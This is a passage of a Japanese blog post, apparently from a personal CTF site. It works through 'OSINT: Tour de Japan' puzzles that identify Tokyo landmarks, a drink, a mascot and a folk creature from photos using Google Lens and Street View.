+<s>DO{Tokyo_Station_Marunouchi_Minamiguchi}</s><br>
+<s>DO{Tokyo_Station_Marunouchi_Building_Minamiguchi}</s><br>
+<s>DO{Marunouchi_Ekisha_Minamiguchi}</s><br>
+<s>DO{Marunouchi_Building_Minamiguchi}</s><br>
+<s>DO{Marunouchi_Building}</s><br>
+<s>DO{Tokyo_Station_Hotel}</s><br>
+<s>DO{Tokyo_Station_City}</s><br>
+<s>DO{Tokyo_Station}</s><br>
+<s>DO{Tokyo_Chiyoda_City}</s><br>
+<s>DO{Tokyo_Chiyoda}</s><br>
+<s>DO{Tokyo_Station_Marunouchi_Station_Building}</s><br>
+<s>DO{Marunouchi_Station_Building}</s><br>
+<s>DO{Tokyo_Marunouchi_Station_Building}</s><br>
+<s>DO{Station_Building}</s><br>
+<s>DO{Tokyo_Station_Building}</s><br>
+<s>DO{Marunouchi_Ekisha}</s><br>
+<s>DO{Tokyo_Marunouchi_Ekisha}</s><br>
+<s>DO{Tokyo_Station_Marunouchi_Ekisha}</s><br>
+<s>DO{Tokyo_Marunouchi_Ekisha_Minamiguchi}</s><br>
+<s>DO{Tokyo_Station_Marunouchi_Ekisha_Minamiguchi}</s><br>
+<s>DO{Tokyo_Station_Marunouchi_station_building}</s><br>
+<s>DO{Marunouchi}</s><br>
+<s>DO{Tokyo_Marunouchi}</s><br>
+<s>DO{Marunouchi_Ekimae_Hiroba}</s><br>
+<s>DO{Ekimae_Hiroba}</s><br>
+<s>DO{Tokyo_Marunouchi_Ekimae_Hiroba}</s><br>
+<s>DO{Tokyo_Eki_Marunouchi_Ekimae_Hiroba}</s><br>
+<s>DO{Miyuki_Dori}</s><br>
+<s>DO{Miyuki_Dori_Street}</s><br>
+<s>DO{Tokyo_Station_Ekimae_Hiroba}</s><br>
+<s>DO{Marunouchi_Daini_Hiroba}</s><br>
+<s>DO{Tokyo_Station_Marunouchi_Ekimae_Hiroba}</s><br>
+<s>DO{Tokyo_Marunouchi_Ekisha}</s><br>
+<s>DO{Central_Stop}</s><br>
+<s>DO{Tokyo_Marunouchi_Central_Stop}</s><br>
+<s>DO{Tokyo_Station_Central_Stop}</s><br>
+<s>DO{Marunouchi_Guchi}</s><br>
+<s>DO{Marunouchiguchi}</s><br>
+<s>DO{Miyuki_Street}</s><br>
+<s>DO{Marunouchi_Plaza}</s><br>
+<s>DO{Gyoko-Dori_Ave}</s><br></p>
+<p>たぶん、こんなに間違ったのは自分だけかもしれません。。</p>
+<p><br /></p>
+<p><b>今日の教訓：トライ・アンド・エラーばかりではなく、ちゃんと写真を解析して解くことが大事！！</b></p>
+<p><br />
+写真をよくみると、撮影位置と駅の間にガードレールがあり、道が通っています。</p>
+<p>また、撮影位置のところには、タイルがきれいに四角く色分けされてます。</p>
+<p>Google Street Viewでクリックして移動していったら、該当箇所が見つかりました。</p>
+<img src="https://captureamerica.github.io/writeups/img/Challenge_5.png" alt="Challenge_5.png">
+<p><br /></p>
+<p>Flag: <code>DO{Gyoko-Dori}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="osint-tour-de-japan-6---along-the-waterways-we-go-75-points">[OSINT: Tour de Japan]: 6 - Along the waterways we go (75 points)</h2>
+<hr>
+<h3 id="challenge-9">Challenge</h3>
+<blockquote>
+<p>Where was this photo taken from?</p>
+</blockquote>
+<img src="https://captureamerica.github.io/writeups/img/Challenge_6.jfif" alt="Challenge_6.jfif">
+<p><br /></p>
+<h3 id="solution-9">Solution</h3>
+<p>「こんなのわかるかよ！」と思いつつ、Google Lensでサーチしたら一発で <code>小名木川</code> が出てきました。</p>
+<p>Google Lens、凄い！</p>
+<p><br /></p>
+<p>Flag: <code>DO{Onagi_River}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="osint-tour-de-japan-7---a-box-of-mystery-100-points">[OSINT: Tour de Japan]: 7 - A box of mystery (100 points)</h2>
+<hr>
+<h3 id="challenge-10">Challenge</h3>
+<blockquote>
+<p>Where was this photo taken from?</p>
+</blockquote>
+<img src="https://captureamerica.github.io/writeups/img/Challenge_7.jpg" alt="Challenge_7.jpg">
+<p><br /></p>
+<h3 id="solution-10">Solution</h3>
+<p>Google Lensでサーチしたら、以下のPDF（国土技術政策総合研究所 研究資料）が見つかりました。</p>
+<p><a href="http://www.nilim.go.jp/lab/bcg/siryou/tnn/tnn0572pdf/ks057208.pdf">http://www.nilim.go.jp/lab/bcg/siryou/tnn/tnn0572pdf/ks057208.pdf</a></p>
+<p>逆に、これ以外の情報は全く見つからなかったです。</p>
+<p>千鳥ヶ淵にある換気所のようです。</p>
+<p>この資料にはマップも載っていて、この換気塔の対面にあるのは <code>イギリス大使館</code> なので、それが答えです。</p>
+<p><br /></p>
+<p>Flag: <code>DO{British_Embassy}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="osint-tour-de-japan-8---a-staple-drink-of-japan-50-points">[OSINT: Tour de Japan]: 8 - A staple drink of Japan (50 points)</h2>
+<hr>
+<h3 id="challenge-11">Challenge</h3>
+<blockquote>
+<p>What is this drink called?</p>
+</blockquote>
+<img src="https://captureamerica.github.io/writeups/img/Challenge_8.jfif" alt="Challenge_8.jfif">
+<p><br /></p>
+<h3 id="solution-11">Solution</h3>
+<p>これも結構悩んだんですが、テキトーに <code>メロンソーダ</code> を入れたら当たりました。</p>
+<p>これって、日本の飲み物なのかな。確かに、外国には <code>メロンソーダ</code> っていうのは無いかも。</p>
+<p><br /></p>
+<p>Flag: <code>DO{Melon_Soda}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="osint-tour-de-japan-9---a-concrete-jungles-forest-heart-50-points">[OSINT: Tour de Japan]: 9 - A concrete jungle&rsquo;s forest heart (50 points)</h2>
+<hr>
+<h3 id="challenge-12">Challenge</h3>
+<blockquote>
+<p>Where was this photo taken from?</p>
+</blockquote>
+<img src="https://captureamerica.github.io/writeups/img/Challenge_9.jfif" alt="Challenge_9.jfif">
+<p><br /></p>
+<h3 id="solution-12">Solution</h3>
+<p>Google Lensで以下のアメブロが見つかりました。</p>
+<p><a href="https://ameblo.jp/gentle-spwj/entry-12423563923.html">https://ameblo.jp/gentle-spwj/entry-12423563923.html</a></p>
+<p><code>目黒の八芳園</code>です。確か、前に行ったことあります。</p>
+<p><br /></p>
+<p>Flag: <code>DO{Happo-en}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="osint-tour-de-japan-10---an-answer-in-plain-sight-250-points">[OSINT: Tour de Japan]: 10 - An answer in plain sight (250 points)</h2>
+<hr>
+<h3 id="challenge-13">Challenge</h3>
+<blockquote>
+<p>Where sector was this photo taken from?</p>
+</blockquote>
+<img src="https://captureamerica.github.io/writeups/img/Challenge_10.jfif" alt="Challenge_10.jfif">
+<p><br /></p>
+<h3 id="solution-13">Solution</h3>
+<p>250点問題だけあって、なかなか手強かったです。</p>
+<p><code>荒川西日三</code> という文字が見えるので、荒川区 西日暮里 3丁目 なのはすぐわかります。でも、それは答えじゃありません。</p>
+<p>右上にはホテルの看板のようなものがあり、<code>荒川 西日暮里 3丁目 おんぼろホテル</code> でサーチしたら <code>谷中 富士見ホテル</code> であることもわかりました。</p>
+<p>ただ、その下の <code>←30M</code> の文字を見逃していたので、富士見ホテルのところで写真を撮ったのと勘違いしてフラグが全然通りませんでした。</p>
+<p>つまり写真を撮った場所は <code>富士見ホテルから30M離れた場所</code> でした。</p>
+<p>Google Mapで富士見ホテルの半径30Mのエリアを探し、Street Viewで確認すると、ありました！</p>
+<img src="https://captureamerica.github.io/writeups/img/Challenge_10.png" alt="Challenge_10.png">
+<p><code>谷中 大島酒店</code> です。でも、これはまだ答えではありません。</p>
+<p><br /></p>
+<p>わたしは知らなかったんですが、この場所、<code>夕焼けだんだん</code> という有名な場所らしいですね。</p>
+<p><br /></p>
+<p>なにかヒントがあるかと思って <code>夕焼けだん団</code> の動画（<a href="https://www.youtube.com/watch?v=kPK75vVniNg">https://www.youtube.com/watch?v=kPK75vVniNg</a>）を見てたら、「谷中」の読み方は「タニナカ」じゃなくて「ヤナカ」であることがわかりました。</p>
+<p>結構、早い段階で「谷中」に辿り着いていたのに、漢字が読めてなかっただけとは。。。</p>
+<p><br /></p>
+<p>Flag: <code>DO{Yanaka}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="osint-tour-de-japan-11---an-island-of-mascots-150-points">[OSINT: Tour de Japan]: 11 - An island of mascots (150 points)</h2>
+<hr>
+<h3 id="challenge-14">Challenge</h3>
+<blockquote>
+<p>Where in Japan does this mascot represent?</p>
+</blockquote>
+<img src="https://captureamerica.github.io/writeups/img/Challenge_11.jfif" alt="Challenge_11.jfif">
+<p><br /></p>
+<h3 id="solution-14">Solution</h3>
+<p><code>あまみ市</code> って書いてあるし。</p>
+<p><br /></p>
+<p>Flag: <code>DO{Amami}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="osint-tour-de-japan-12---a-story-of-the-ages-75-points">[OSINT: Tour de Japan]: 12 - A story of the ages (75 points)</h2>
+<hr>
+<h3 id="challenge-15">Challenge</h3>
+<blockquote>
+<p>What mythological creature is this?</p>
+</blockquote>
+<img src="https://captureamerica.github.io/writeups/img/Challenge_12.jfif" alt="Challenge_12.jfif">
+<p><br /></p>
+<h3 id="solution-15">Solution</h3>
+<p>ぶんぶく茶釜ですね。</p>
+<p><s>DO{Raccoon}</s><br>
+<s>DO{Bunbuku_Chagama}</s><br>
+<s>DO{Fox}</s><br>
+<s>DO{Raccoon_Dog}</s><br></p>
+<p>普通に <code>タヌキ</code> が正解でした。</p>
+<p><br /></p>
+<p>Flag: <code>DO{Tanuki}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="osint-tour-de-japan-13---the-river-of-sakura-75-points">[OSINT: Tour de Japan]: 13 - The river of Sakura (75 points)</h2>
+<hr>
+<h3 id="challenge-16">Challenge</h3>
+<blockquote>
+<p>Where was this photo taken from?</p>
+</blockquote>
+<img src="https://captureamerica.github.io/writeups/img/Challenge_13.jfif" alt="Challenge_13.jfif">
+<p><br /></p>
+<h3 id="solution-16">Solution</h3>
+<p>これは、調べるまでもなく、目黒川です。</p>
+<p><br /></p>
+<p>Flag: <code>DO{Meguro_River}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<hr>
+<p><br /><br />
+<br /><br /></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">CaptureAmerica @ CTF フラxxグゲット</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2021-10-13
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
+          <a href="https://captureamerica.github.io/writeups/tags/reviewed/">Reviewed</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="https://captureamerica.github.io/writeups/post/deconstruct_ctf_2021/">
+            <span class="next-text nav-default">DeconstruCT.F 2021 Writeup</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
+  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2021<span class="heart"><i class="iconfont icon-heart"></i></span><span>CaptureAmerica @ CTF フラxxグゲット</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  
+
+
+
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-104910699-2', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
